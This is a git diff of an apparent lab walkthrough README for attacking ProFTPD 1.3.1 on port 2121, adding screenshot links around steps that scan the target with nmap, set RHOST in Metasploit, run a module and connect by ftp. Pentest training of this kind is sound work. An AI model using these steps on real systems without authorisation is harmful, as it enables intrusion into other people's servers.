@@ -1,5 +1,7 @@
 # Port-2121-ProFTPD-1.3.1
 1.nmap -sV (target ip)
+![image](https://github.com/thanawut2903/Port-2121-ProFTPD-1.3.1/assets/159118913/82f3c6e8-513a-422e-9d02-59cf02e9d665)
+
 
 2.msfconsole
 
@@ -18,6 +20,7 @@
 9.msf 6 > set RHOST (target ip)
 
 10. msf 6 > run
+
 ![image](https://github.com/thanawut2903/Port-2121-ProFTPD-1.3.1/assets/159118913/3c3054e1-83a5-4094-9a85-ac72f0216828)
 
 11.ftp (target ip) 
